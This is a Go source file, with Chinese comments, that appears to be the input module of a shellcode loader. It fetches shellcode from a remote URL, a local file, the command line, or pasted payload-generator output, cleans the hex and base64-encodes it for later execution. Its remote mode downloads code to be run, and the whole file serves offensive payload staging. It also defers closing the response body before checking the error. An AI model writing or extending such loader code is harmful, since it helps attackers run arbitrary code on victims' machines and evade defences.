package server

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

// UriModel  远程模式
func UriModel() {
	resp, err := http.Get(Uri)
	defer resp.Body.Close()

	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	ShellCodeByte = body
}

// ReadFileModel 读取本地文件模式
func ReadFileModel() {
	file, err := os.Open(FilePath)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	body, err := io.ReadAll(file)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	ShellCodeByte = body
	defer file.Close()
}

// ResourceModel 原文件模式
func ResourceModel() {
	var str string
	file, err := os.Open(Resource)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	fileByte, err := io.ReadAll(file)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	defer file.Close()
	fileStr := string(fileByte)
	if strings.Contains(fileStr, "{") {
		//这是Java和C#之流，截取{}内的hex
		str = fileStr[strings.LastIndex(fileStr, "{")+1 : strings.LastIndex(fileStr, "}")]
	} else if strings.Contains(fileStr, "\\x") {
		//这是c、python之流，提取""内的hex
		str = fileStr[strings.Index(fileStr, "\"")+1 : strings.LastIndex(fileStr, "\"")]
	}

	//过滤杂项
	str = strings.ReplaceAll(str, "buf += b", "")
	str = strings.ReplaceAll(str, "buf +=", "")
	str = strings.ReplaceAll(str, "\"", "")
	str = strings.ReplaceAll(str, "\\x", "")
	str = strings.ReplaceAll(str, "0x", "")
	str = strings.ReplaceAll(str, " ", "")
	str = strings.ReplaceAll(str, ";", "")
	str = strings.ReplaceAll(str, ",", "")
	str = strings.ReplaceAll(str, "\n", "")
	str = strings.ReplaceAll(str, "\t", "")
	str = strings.ReplaceAll(str, "\r", "")
	str = base64.StdEncoding.EncodeToString([]byte(str))
	ShellCodeByte = []byte(str)
}

func CommLineModel() {
	ShellCodeByte = []byte(CommLineCode)
}
